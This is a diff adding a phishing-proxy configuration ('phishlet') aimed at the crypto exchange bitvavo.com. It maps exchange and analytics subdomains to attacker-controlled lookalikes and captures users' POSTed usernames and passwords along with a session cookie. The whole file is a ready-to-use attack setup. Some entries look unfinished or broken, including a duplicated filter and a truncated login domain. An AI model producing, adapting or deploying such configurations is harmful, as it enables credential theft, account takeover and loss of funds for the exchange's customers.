@@ -1,0 +1,32 @@
+author: 'SimplerHacking'
+min_ver: '3.3.0'
+name: 'My Easy Phishlet Template v2'
+
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'bitvavo.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'bitvavo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www2', orig_sub: 'www', domain: 'google-analytics.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'edge', orig_sub: 'edge', domain: 'bitvavo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'ws', orig_sub: 'ws', domain: 'bitvavo.com', session: true, is_landing: false, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'bitvavo.com', orig_sub: '', domain: '', search: 'login', replace: 'Test', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'bitvavo.com', orig_sub: '', domain: '', search: 'login', replace: 'Test', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+auth_tokens:
+  - domain: '.bitvavo.com'
+    keys: ['__cf_bm']
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: '.bitvavo'
+  path: '/en'
